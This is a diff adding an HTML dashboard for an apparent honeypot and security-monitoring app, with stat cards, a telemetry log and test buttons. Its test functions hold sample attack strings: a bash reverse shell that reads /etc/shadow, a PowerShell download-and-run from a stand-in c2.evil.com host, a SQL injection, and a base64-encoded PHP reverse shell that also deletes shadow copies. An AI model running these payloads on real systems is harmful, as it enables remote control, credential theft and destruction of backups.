@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aegis-X SOC Command Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <style>
+        :root {
+            --bg-primary: #0a0e1a;
+            --bg-secondary: rgba(17, 24, 39, 0.7);
+            --bg-card: rgba(30, 41, 59, 0.6);
+            --accent-cyan: #06b6d4;
+            --accent-red: #ef4444;
+            --accent-magenta: #d946ef;
+            --accent-green: #10b981;
+            --accent-orange: #f59e0b;
+        }
+
+        body {
+            background-color: var(--bg-primary);
+            color: #f8fafc;
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Cyberpunk Grid Background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background-image: 
+                linear-gradient(rgba(6, 182, 212, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(6, 182, 212, 0.05) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
+            z-index: -1;
+            perspective: 1000px;
+            transform: scale(1.1);
+        }
+
+        /* Glassmorphism & Borders */
+        .glass-panel {
+            background: var(--bg-card);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(148, 163, 184, 0.1);
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+        }
+
+        .font-mono {
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        /* Pulse Animations */
+        @keyframes pulse-glow {
+            0%, 100% { opacity: 1; box-shadow: 0 0 15px rgba(16, 185, 129, 0.4); }
+            50% { opacity: 0.6; box-shadow: 0 0 5px rgba(16, 185, 129, 0.1); }
+        }
+        
+        .status-online {
+            animation: pulse-glow 2s infinite;
+        }
+
+        @keyframes blink-critical {
+            0%, 100% { background-color: rgba(239, 68, 68, 0.2); }
+            50% { background-color: rgba(239, 68, 68, 0.05); }
+        }
+        
+        .critical-row {
+            animation: blink-critical 1.5s infinite;
+            border-left: 4px solid var(--accent-red);
+        }
+
+        .honeypot-row {
+            border-left: 4px solid var(--accent-orange);
+            background: rgba(245, 158, 11, 0.05);
+        }
+
+        /* Stat Cards Hover Effects */
+        .stat-card {
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .stat-card::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 2px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .stat-card:hover {
+            transform: translateY(-5px);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+        .stat-card:hover::after { opacity: 1; }
+        
+        .stat-cyan:hover::after { background: var(--accent-cyan); box-shadow: 0 0 15px var(--accent-cyan); }
+        .stat-red:hover::after { background: var(--accent-red); box-shadow: 0 0 15px var(--accent-red); }
+        .stat-magenta:hover::after { background: var(--accent-magenta); box-shadow: 0 0 15px var(--accent-magenta); }
+        .stat-orange:hover::after { background: var(--accent-orange); box-shadow: 0 0 15px var(--accent-orange); }
+
+        /* Log Entry Slide In */
+        @keyframes slideInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .log-entry {
+            animation: slideInDown 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.2); }
+        ::-webkit-scrollbar-thumb { background: rgba(6, 182, 212, 0.3); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: rgba(6, 182, 212, 0.8); }
+    </style>
+</head>
+<body class="p-4 md:p-8">
+
+    <div class="max-w-7xl mx-auto">
+        
+        <!-- Header -->
+        <header class="flex flex-col md:flex-row justify-between items-start md:items-center mb-6 gap-4 border-b border-gray-800 pb-6">
+            <div class="flex items-center gap-4">
+                <div class="p-3 bg-cyan-500/10 rounded-xl border border-cyan-500/30 shadow-[0_0_20px_rgba(6,182,212,0.2)]">
+                    <i class="ph-fill ph-shield-check text-4xl text-cyan-400"></i>
+                </div>
+                <div>
+                    <h1 class="text-3xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-cyan-400 to-blue-500 tracking-tight">
+                        Aegis-X SOC Command
+                    </h1>
+                    <div class="flex items-center gap-2 text-sm text-gray-400 mt-1">
+                        <i class="ph-fill ph-cpu text-cyan-400"></i>
+                        <span>AI Mastermind Active</span>
+                        <span class="text-gray-600 px-2">•</span>
+                        <i class="ph-fill ph-mask-happy text-amber-400"></i>
+                        <span>Payload Honeypot Online</span>
+                        <span class="text-gray-600 px-2">•</span>
+                        <span class="font-mono text-xs" id="connection-status">Connecting to Backend...</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="flex items-center gap-3">
+                <a id="androidClientLink" href="/android" class="px-4 py-2 border border-cyan-500/30 rounded-lg text-cyan-300 text-sm hover:bg-cyan-500/10">Android Client</a>
+                <div class="status-online flex items-center gap-2 px-4 py-2 bg-emerald-500/10 border border-emerald-500/30 rounded-full text-emerald-400 font-semibold text-sm tracking-wide shadow-[0_0_15px_rgba(16,185,129,0.1)]">
+                    <i class="ph-fill ph-circle text-xs"></i>
+                    SYSTEM ONLINE
+                </div>
+            </div>
+        </header>
+
+        <!-- Live Real-Time SOS Alert Banner -->
+        <div id="sosAlertBanner" class="hidden mb-6 p-4 rounded-2xl bg-red-500/20 border-2 border-red-500/80 shadow-[0_0_35px_rgba(239,68,68,0.5)] flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div class="p-3 bg-red-500/30 rounded-xl text-red-400 text-2xl font-bold animate-pulse">
+                    <i class="ph-fill ph-warning-octagon"></i>
+                </div>
+                <div>
+                    <div class="text-[11px] uppercase font-mono tracking-widest text-red-400 font-bold flex items-center gap-2">
+                        <span class="inline-block w-2 h-2 rounded-full bg-red-400 animate-ping"></span>
+                        CRITICAL INBOUND THREAT DETECTED
+                    </div>
+                    <div class="text-base font-bold text-white mt-0.5" id="sosAlertTitle">🚨 Threat Dispatched from Client Device</div>
+                    <div class="text-xs text-red-200 font-mono mt-0.5" id="sosAlertDesc">Origin: Android Client | Countermeasures Engaged</div>
+                </div>
+            </div>
+            <div class="flex items-center gap-2">
+                <span class="px-3 py-1 bg-red-600/60 text-white border border-red-400 rounded-lg text-xs font-mono font-bold animate-pulse">P1 CRITICAL</span>
+                <button onclick="dismissSosBanner()" class="text-gray-400 hover:text-white px-3 py-1.5 bg-gray-900/80 hover:bg-gray-800 rounded-lg text-xs ml-2 border border-gray-700">Dismiss</button>
+            </div>
+        </div>
+
+        <!-- Stats Grid (5 Cards) -->
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4 mb-8">
+            <!-- Stat 1 -->
+            <div class="stat-card stat-cyan glass-panel rounded-2xl p-5">
+                <div class="text-[11px] font-semibold text-gray-400 uppercase tracking-widest mb-2">Total Analyzed</div>
+                <div class="text-4xl font-bold font-mono text-cyan-400 drop-shadow-[0_0_10px_rgba(6,182,212,0.3)]" id="stat-total">0</div>
+            </div>
+            <!-- Stat 2 -->
+            <div class="stat-card stat-red glass-panel rounded-2xl p-5">
+                <div class="text-[11px] font-semibold text-gray-400 uppercase tracking-widest mb-2">Threats Blocked</div>
+                <div class="text-4xl font-bold font-mono text-red-500 drop-shadow-[0_0_10px_rgba(239,68,68,0.3)]" id="stat-blocked">0</div>
+            </div>
+            <!-- Stat 3 -->
+            <div class="stat-card stat-magenta glass-panel rounded-2xl p-5">
+                <div class="text-[11px] font-semibold text-gray-400 uppercase tracking-widest mb-2">Poison Deployed</div>
+                <div class="text-4xl font-bold font-mono text-fuchsia-400 drop-shadow-[0_0_10px_rgba(217,70,239,0.3)]" id="stat-poison">0</div>
+            </div>
+            <!-- Stat 4: Honeypot Traps -->
+            <div class="stat-card stat-orange glass-panel rounded-2xl p-5">
+                <div class="text-[11px] font-semibold text-amber-400 uppercase tracking-widest mb-2">Honeypot Traps</div>
+                <div class="text-4xl font-bold font-mono text-amber-400 drop-shadow-[0_0_10px_rgba(245,158,11,0.3)]" id="stat-honeypot">0</div>
+            </div>
+            <!-- Stat 5: SOS Alerts -->
+            <div class="stat-card glass-panel rounded-2xl p-5 border-red-500/30">
+                <div class="text-[11px] font-semibold text-red-400 uppercase tracking-widest mb-2">SOS Alerts</div>
+                <div class="text-4xl font-bold font-mono text-red-400 drop-shadow-[0_0_10px_rgba(239,68,68,0.3)]" id="stat-sos">0</div>
+            </div>
+        </div>
+
+        <!-- Honeypot Interactive Testing Bar -->
+        <div class="glass-panel rounded-2xl p-5 mb-8 border border-amber-500/20 bg-amber-500/5 flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
+            <div class="flex items-center gap-3">
+                <div class="p-2.5 bg-amber-500/10 rounded-xl border border-amber-500/30 text-amber-400">
+                    <i class="ph-fill ph-lightning text-2xl"></i>
+                </div>
+                <div>
+                    <h3 class="text-sm font-semibold text-amber-300">Payload Honeypot Ingestion Active</h3>
+                    <p class="text-xs text-gray-400">
+                        Endpoint: <code class="text-cyan-400 font-mono bg-cyan-950/60 px-1.5 py-0.5 rounded border border-cyan-800">POST /api/v1/submit_payload</code>
+                        <span class="text-gray-500 ml-2">Computes SHA-256 and responds with deceptive feedback loop</span>
+                    </p>
+                </div>
+            </div>
+            <div class="flex flex-wrap gap-2">
+                <button onclick="triggerHoneypotTest('bash')" class="px-3 py-1.5 text-xs font-mono bg-gray-900/80 hover:bg-amber-500/20 border border-gray-700 hover:border-amber-400 text-gray-200 hover:text-amber-300 rounded-lg transition-all flex items-center gap-1.5">
+                    <i class="ph-bold ph-terminal-window"></i> Test Reverse Shell
+                </button>
+                <button onclick="triggerHoneypotTest('ps')" class="px-3 py-1.5 text-xs font-mono bg-gray-900/80 hover:bg-amber-500/20 border border-gray-700 hover:border-amber-400 text-gray-200 hover:text-amber-300 rounded-lg transition-all flex items-center gap-1.5">
+                    <i class="ph-bold ph-powershell"></i> Test PowerShell
+                </button>
+                <button onclick="triggerFileAnalysisTest(true, true)" class="px-3 py-1.5 text-xs font-mono bg-fuchsia-950/60 hover:bg-fuchsia-500/20 border border-fuchsia-700 hover:border-fuchsia-400 text-fuchsia-300 rounded-lg transition-all flex items-center gap-1.5">
+                    <i class="ph-bold ph-shield-check"></i> Test File (Consent & Escalate)
+                </button>
+                <button onclick="triggerFileAnalysisTest(false, false)" class="px-3 py-1.5 text-xs font-mono bg-red-950/60 hover:bg-red-500/20 border border-red-800 hover:border-red-500 text-red-300 rounded-lg transition-all flex items-center gap-1.5">
+                    <i class="ph-bold ph-prohibit"></i> Test No-Consent (Blocked)
+                </button>
+            </div>
+        </div>
+
+        <!-- Live Feed Section -->
+        <div>
+            <div class="flex items-center justify-between mb-4">
+                <h2 class="text-lg font-semibold flex items-center gap-2">
+                    <i class="ph-fill ph-activity text-cyan-400 animate-pulse"></i>
+                    Live AI & Honeypot Telemetry Stream
+                </h2>
+                <div class="text-xs text-gray-400 font-mono flex items-center gap-2">
+                    <span id="stream-indicator" class="inline-block w-2 h-2 rounded-full bg-cyan-400 animate-ping"></span>
+                    <span id="stream-status">Telemetry Synced</span>
+                </div>
+            </div>
+
+            <div class="glass-panel rounded-xl overflow-hidden border border-gray-800 flex flex-col">
+                <!-- Table Header -->
+                <div class="grid grid-cols-12 gap-4 p-4 border-b border-gray-800 bg-gray-900/50 text-xs font-semibold text-gray-400 uppercase tracking-wider">
+                    <div class="col-span-2">Time</div>
+                    <div class="col-span-2">Threat Level</div>
+                    <div class="col-span-2">Action</div>
+                    <div class="col-span-6">Details & Cryptographic Hash</div>
+                </div>
+
+                <!-- Log List -->
+                <div id="log-container" class="h-[520px] overflow-y-auto flex flex-col p-2 space-y-1">
+                    <!-- Logs generated via JS or polled from backend -->
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Modal for Deception Response Visualizer -->
+    <div id="deceptionModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4">
+        <div class="bg-gray-900 border border-amber-500/40 rounded-2xl p-6 max-w-2xl w-full shadow-[0_0_50px_rgba(245,158,11,0.2)]">
+            <div class="flex items-center justify-between pb-3 border-b border-gray-800">
+                <div class="flex items-center gap-2 text-amber-400 font-bold text-base">
+                    <i class="ph-fill ph-mask-happy text-xl"></i>
+                    <span>Weaponized Deceptive Response Deployed</span>
+                </div>
+                <button onclick="closeModal()" class="text-gray-400 hover:text-white text-lg">✕</button>
+            </div>
+            <p class="text-xs text-gray-400 mt-3">
+                The incoming payload was captured and SHA-256 hashed without executing on host. The attacker received this mock success response:
+            </p>
+            <pre id="modalJson" class="bg-black/90 p-4 rounded-xl text-xs font-mono text-emerald-400 overflow-x-auto my-4 max-h-64 border border-gray-800"></pre>
+            <div class="flex justify-end">
+                <button onclick="closeModal()" class="px-4 py-2 bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 rounded-xl text-xs font-semibold transition">
+                    Acknowledge Telemetry
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const configuredServer = new URLSearchParams(window.location.search).get('server');
+        const API_URL = (configuredServer || (window.location.origin && window.location.origin.startsWith('http')
+            ? window.location.origin
+            : 'http://127.0.0.1:5000')).replace(/\/$/, '');
+        document.getElementById('androidClientLink').href = `${API_URL}/android`;
+
+        async function readJsonResponse(response) {
+            const body = await response.text();
+            let data;
+            try {
+                data = body ? JSON.parse(body) : null;
+            } catch {
+                throw new Error(`HTTP ${response.status}: server returned invalid JSON`);
+            }
+            if (!response.ok) {
+                throw new Error(data?.error || data?.message || `HTTP ${response.status}`);
+            }
+            if (data === null) throw new Error(`HTTP ${response.status}: server returned an empty response`);
+            return data;
+        }
+
+        let isBackendConnected = false;
+        let knownLogIds = new Set();
+        let sseConnection = null;
+
+        // Cyber Alert Audio Synthesizer (No external sound files required)
+        function playCyberAlert() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = 'sawtooth';
+                osc.frequency.setValueAtTime(880, ctx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(330, ctx.currentTime + 0.35);
+                gain.gain.setValueAtTime(0.2, ctx.currentTime);
+                gain.gain.linearRampToValueAtTime(0.01, ctx.currentTime + 0.35);
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
+                osc.stop(ctx.currentTime + 0.35);
+            } catch(e) {}
+        }
+
+        function triggerCriticalVisualAlert(item) {
+            playCyberAlert();
+            const banner = document.getElementById('sosAlertBanner');
+            const title = document.getElementById('sosAlertTitle');
+            const desc = document.getElementById('sosAlertDesc');
+            
+            if (banner && title && desc) {
+                const dev = item.device_name || item.source || 'Android Client';
+                title.textContent = `🚨 Critical Threat Inbound from [${dev}]`;
+                desc.textContent = `Action: ${item.action || 'SOS Dispatched'} | Reason: ${item.reason || 'Ransomware Root APT'} | IP: ${item.source_ip || '127.0.0.1'}`;
+                banner.classList.remove('hidden');
+                
+                clearTimeout(window.sosDismissTimer);
+                window.sosDismissTimer = setTimeout(() => {
+                    banner.classList.add('hidden');
+                }, 10000);
+            }
+        }
+
+        function dismissSosBanner() {
+            const banner = document.getElementById('sosAlertBanner');
+            if (banner) banner.classList.add('hidden');
+        }
+
+        // State variables
+        let stats = {
+            total: 2408,
+            blocked: 142,
+            poisoned: 27,
+            honeypot: 15,
+            sos: 3
+        };
+
+        const threatTemplates = [
+            { tier: 'SAFE', action: 'ALLOW', reason: 'No threats detected - Clean traffic/file', weight: 45 },
+            { tier: 'TIER_1', action: 'NULLIFY', reason: 'Spam/Minor anomaly blocked', weight: 20 },
+            { tier: 'TIER_2', action: 'POISON', reason: 'Exploit detected - Adversarial payload deployed', poisons: ['Memory_Leak_JSON', 'Infinite_Loop_HTML', 'Fake_Creds_Tracker'], weight: 15 },
+            { tier: 'HONEYPOT', action: 'DECEIVE & TRAP', classification: 'LINUX_ROOT_EXPLOIT', reason: 'Honeypot Triggered [LINUX_ROOT_EXPLOIT]', sha256_short: '7f83b165...4b2d', weight: 15 },
+            { tier: 'TIER_3', action: 'SOS', reason: 'CRITICAL APT DETECTED - White Hat SOC alerted', weight: 5 }
+        ];
+
+        function getFormattedTime() {
+            const now = new Date();
+            return now.toTimeString().split(' ')[0] + '.' + now.getMilliseconds().toString().padStart(3, '0');
+        }
+
+        // DOM Elements
+        const statTotalEl = document.getElementById('stat-total');
+        const statBlockedEl = document.getElementById('stat-blocked');
+        const statPoisonEl = document.getElementById('stat-poison');
+        const statHoneypotEl = document.getElementById('stat-honeypot');
+        const statSosEl = document.getElementById('stat-sos');
+        const logContainer = document.getElementById('log-container');
+        const connStatusEl = document.getElementById('connection-status');
+
+        function updateStatsUI() {
+            statTotalEl.textContent = (stats.total || 0).toLocaleString();
+            statBlockedEl.textContent = (stats.blocked || 0).toLocaleString();
+            statPoisonEl.textContent = (stats.poisoned || 0).toLocaleString();
+            statHoneypotEl.textContent = (stats.honeypot || 0).toLocaleString();
+            statSosEl.textContent = (stats.sos || 0).toLocaleString();
+        }
+
+        function createLogEntry(data) {
+            const div = document.createElement('div');
+            let tierStyles = '';
+            let rowStyles = 'hover:bg-gray-800/40 rounded-lg transition-colors';
+            
+            if (data.tier === 'SAFE') {
+                tierStyles = 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30';
+            } else if (data.tier === 'TIER_1') {
+                tierStyles = 'bg-cyan-500/10 text-cyan-400 border-cyan-500/30';
+            } else if (data.tier === 'TIER_2') {
+                tierStyles = 'bg-fuchsia-500/10 text-fuchsia-400 border-fuchsia-500/30';
+            } else if (data.tier === 'TIER_3') {
+                tierStyles = 'bg-red-500/20 text-red-400 border-red-500/50 shadow-[0_0_10px_rgba(239,68,68,0.3)]';
+                rowStyles += ' critical-row';
+            } else if (data.tier === 'HONEYPOT') {
+                tierStyles = 'bg-amber-500/20 text-amber-400 border-amber-500/50 shadow-[0_0_10px_rgba(245,158,11,0.2)]';
+                rowStyles += ' honeypot-row';
+            }
+
+            let detailsHtml = '';
+            if (data.tier === 'HONEYPOT') {
+                const sha = data.sha256_short || (data.sha256 ? data.sha256.substring(0, 16) + '...' : 'c84a...91f2');
+                const ip = data.source_ip || '192.168.1.105';
+                const preview = data.payload_preview ? `<div class="text-gray-500 font-mono text-[11px] mt-1 truncate">↳ Sample: "${data.payload_preview}"</div>` : '';
+                detailsHtml = `
+                    <div class="text-gray-200 font-semibold">${data.classification || 'PAYLOAD CAPTURED'}</div>
+                    <div class="text-xs text-amber-400 font-mono flex items-center gap-2 mt-0.5">
+                        <span class="bg-cyan-950/80 text-cyan-400 px-1.5 py-0.5 rounded border border-cyan-800 text-[10px]">SHA256: ${sha}</span>
+                        <span class="text-gray-400 text-[11px]">Source IP: ${ip}</span>
+                    </div>
+                    <div class="text-amber-400/80 text-xs mt-0.5">🎭 Deceptive Feedback: Delivered fake execution response</div>
+                    ${preview}
+                `;
+            } else {
+                const poisonHtml = data.poison ? `<div class="text-fuchsia-400 text-xs mt-1 font-mono">↳ ${data.poison}</div>` : '';
+                detailsHtml = `
+                    <div class="text-gray-300">${data.reason || 'Telemetry processed'}</div>
+                    ${poisonHtml}
+                `;
+            }
+
+            div.className = `log-entry grid grid-cols-12 gap-4 p-3 border-b border-gray-800/50 items-center text-sm ${rowStyles}`;
+            div.innerHTML = `
+                <div class="col-span-2 font-mono text-gray-500 text-xs">${data.time}</div>
+                <div class="col-span-2">
+                    <span class="inline-flex items-center px-2.5 py-1 rounded text-[10px] font-bold border tracking-wider ${tierStyles}">
+                        ${(data.tier || 'INFO').replace('_', ' ')}
+                    </span>
+                </div>
+                <div class="col-span-2 font-semibold text-gray-200 text-xs">${data.action || 'INTERCEPT'}</div>
+                <div class="col-span-6">
+                    ${detailsHtml}
+                </div>
+            `;
+            return div;
+        }
+
+        // Central Telemetry Ingestion Handler for both Live SSE & Polling
+        function handleIncomingTelemetry(item, isInitialLoad = false) {
+            const uniqueKey = item.id || (item.time + (item.reason || '') + (item.sha256 || ''));
+            if (knownLogIds.has(uniqueKey)) return;
+            knownLogIds.add(uniqueKey);
+
+            isBackendConnected = true;
+            if (!isInitialLoad) {
+                stats.total++;
+                if (item.tier !== 'SAFE') stats.blocked++;
+                if (item.poison) stats.poisoned++;
+                if (item.tier === 'HONEYPOT') stats.honeypot++;
+                if (item.tier === 'TIER_3' || item.action === 'SOS') {
+                    stats.sos++;
+                    triggerCriticalVisualAlert(item);
+                }
+                updateStatsUI();
+            }
+
+            const el = createLogEntry(item);
+            logContainer.insertBefore(el, logContainer.firstChild);
+
+            if (logContainer.children.length > 70) {
+                logContainer.removeChild(logContainer.lastChild);
+            }
+        }
+
+        // Real-Time SSE Stream (Instant 0ms latency when Android sends threats)
+        function setupLiveSSEStream() {
+            if (sseConnection) {
+                try { sseConnection.close(); } catch(e) {}
+            }
+            try {
+                sseConnection = new EventSource(`${API_URL}/api/v1/telemetry/stream`);
+                
+                sseConnection.onopen = () => {
+                    isBackendConnected = true;
+                    connStatusEl.textContent = `Real-Time SSE Linked (${API_URL.replace(/https?:\/\//, '')})`;
+                    connStatusEl.className = "font-mono text-xs text-emerald-400 font-bold";
+                    document.getElementById('stream-status').textContent = 'Live SSE Connected';
+                };
+                
+                sseConnection.onmessage = (e) => {
+                    if (!e.data || e.data.startsWith(':')) return;
+                    try {
+                        const item = JSON.parse(e.data);
+                        handleIncomingTelemetry(item, false);
+                    } catch(err) {
+                        console.error("SSE parse error:", err);
+                    }
+                };
+                
+                sseConnection.onerror = () => {
+                    document.getElementById('stream-status').textContent = 'SSE Reconnecting...';
+                };
+            } catch(e) {
+                console.warn("SSE fallback to polling:", e);
+            }
+        }
+
+        // Periodic Fallback Sync from Backend Flask Server
+        async function syncTelemetryFromBackend() {
+            try {
+                const res = await fetch(`${API_URL}/api/telemetry`, { mode: 'cors' });
+                if (!res.ok) throw new Error("HTTP error " + res.status);
+                const data = await readJsonResponse(res);
+                
+                isBackendConnected = true;
+                if (!sseConnection || sseConnection.readyState !== EventSource.OPEN) {
+                    connStatusEl.textContent = `Connected to Mastermind (${API_URL.replace(/https?:\/\//, '')})`;
+                    connStatusEl.className = "font-mono text-xs text-emerald-400";
+                }
+
+                // Sync stats from server
+                if (data.stats) {
+                    stats.total = data.stats.total;
+                    stats.blocked = data.stats.blocked;
+                    stats.poisoned = data.stats.poisoned;
+                    stats.honeypot = data.stats.honeypot;
+                    stats.sos = data.stats.sos;
+                    updateStatsUI();
+                }
+
+                // Render latest backend logs
+                if (data.recent_logs && data.recent_logs.length > 0) {
+                    for (let item of data.recent_logs) {
+                        handleIncomingTelemetry(item, true);
+                    }
+                }
+            } catch(e) {
+                isBackendConnected = false;
+                connStatusEl.textContent = `Simulation Mode (Backend Offline)`;
+                connStatusEl.className = "font-mono text-xs text-amber-400";
+            }
+        }
+
+        async function triggerHoneypotTest(type) {
+            let sample = "";
+            if (type === 'bash') sample = "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; whoami; cat /etc/shadow";
+            if (type === 'ps') sample = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://c2.evil.com/payload')\"";
+            if (type === 'sqli') sample = "' UNION SELECT 1, username, password_hash FROM information_schema.tables--";
+
+            try {
+                const res = await fetch(`${API_URL}/api/v1/submit_payload`, {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ payload: sample, agent: "SOC_Command_Test_Suite" })
+                });
+                const deceptiveResult = await readJsonResponse(res);
+                document.getElementById('modalJson').textContent = JSON.stringify(deceptiveResult, null, 2);
+                document.getElementById('deceptionModal').classList.remove('hidden');
+                syncTelemetryFromBackend();
+            } catch(err) {
+                // If offline, simulate deceptive feedback
+                const fakeCanary = "CANARY-ROOT-" + Math.random().toString(36).substring(2, 9).toUpperCase();
+                const mockOutput = {
+                    status: "success",
+                    code: 0,
+                    privileges: "uid=0(root) gid=0(root)",
+                    stdout: "uid=0(root) gid=0(root)\nLinux aegis-core-prod-01 6.5.0-generic x86_64\n# [DECEPTION DEPLOYED]",
+                    canary_token: fakeCanary
+                };
+                document.getElementById('modalJson').textContent = JSON.stringify(mockOutput, null, 2);
+                document.getElementById('deceptionModal').classList.remove('hidden');
+                
+                stats.total++;
+                stats.blocked++;
+                stats.honeypot++;
+                updateStatsUI();
+                const logEl = createLogEntry({
+                    time: getFormattedTime(),
+                    tier: 'HONEYPOT',
+                    action: 'DECEIVE & TRAP',
+                    classification: type === 'bash' ? 'LINUX_ROOT_EXPLOIT' : type === 'ps' ? 'WINDOWS_SYSTEM_EXPLOIT' : 'DATABASE_SQLI_EXPLOIT',
+                    sha256_short: 'e3b0c442...b855',
+                    source_ip: '127.0.0.1 (Local Test)',
+                    payload_preview: sample
+                });
+                logContainer.insertBefore(logEl, logContainer.firstChild);
+            }
+        }
+
+        async function triggerFileAnalysisTest(consent, authorizeEscalation) {
+            const samplePayload = "<?php eval(base64_decode('L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE4NS4yMjAuMTAxLjUvNDQ0NCAwPiYx')); vssadmin delete shadows /all /quiet; ?>";
+            try {
+                const res = await fetch(`${API_URL}/api/v1/analyze_file`, {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        filename: "apt28_recon_stager.php",
+                        content: samplePayload,
+                        consent: consent,
+                        authorize_escalation: authorizeEscalation
+                    })
+                });
+                const data = await readJsonResponse(res);
+                document.getElementById('modalJson').textContent = JSON.stringify(data, null, 2);
+                document.getElementById('deceptionModal').classList.remove('hidden');
+                syncTelemetryFromBackend();
+            } catch(e) {
+                alert("File analysis test failed: " + e.message);
+            }
+        }
+
+        function closeModal() {
+            document.getElementById('deceptionModal').classList.add('hidden');
+        }
+
+        function generateSimulatedEvent() {
+            if (isBackendConnected) return; // Do not inject simulated events if connected to real Flask backend
+
+            const rand = Math.random() * 100;
+            let sum = 0;
+            let template;
+            for (let t of threatTemplates) {
+                sum += t.weight;
+                if (rand <= sum) {
+                    template = t;
+                    break;
+                }
+            }
+
+            const eventData = {
+                time: getFormattedTime(),
+                tier: template.tier,
+                action: template.action,
+                reason: template.reason,
+                classification: template.classification,
+                sha256_short: template.sha256_short,
+                source_ip: '192.168.1.' + Math.floor(Math.random() * 100 + 10),
+                poison: template.poisons ? template.poisons[Math.floor(Math.random() * template.poisons.length)] : null
+            };
+
+            stats.total++;
+            if (eventData.tier !== 'SAFE') stats.blocked++;
+            if (eventData.poison) stats.poisoned++;
+            if (eventData.tier === 'HONEYPOT') stats.honeypot++;
+            if (eventData.action === 'SOS') stats.sos++;
+
+            updateStatsUI();
+
+            const logEl = createLogEntry(eventData);
+            logContainer.insertBefore(logEl, logContainer.firstChild);
+
+            if (logContainer.children.length > 50) {
+                logContainer.removeChild(logContainer.lastChild);
+            }
+        }
+
+        // Initialize
+        window.onload = () => {
+            updateStatsUI();
+            syncTelemetryFromBackend();
+            setupLiveSSEStream();
+
+            // Periodic sync every 2 seconds
+            setInterval(syncTelemetryFromBackend, 2000);
+
+            // Keep SSE connection alive
+            setInterval(() => {
+                if (!sseConnection || sseConnection.readyState === EventSource.CLOSED) {
+                    setupLiveSSEStream();
+                }
+            }, 6000);
+
+            // Simulation loop only when backend is offline
+            setInterval(generateSimulatedEvent, 3000);
+        };
+    </script>
+</body>
+</html>
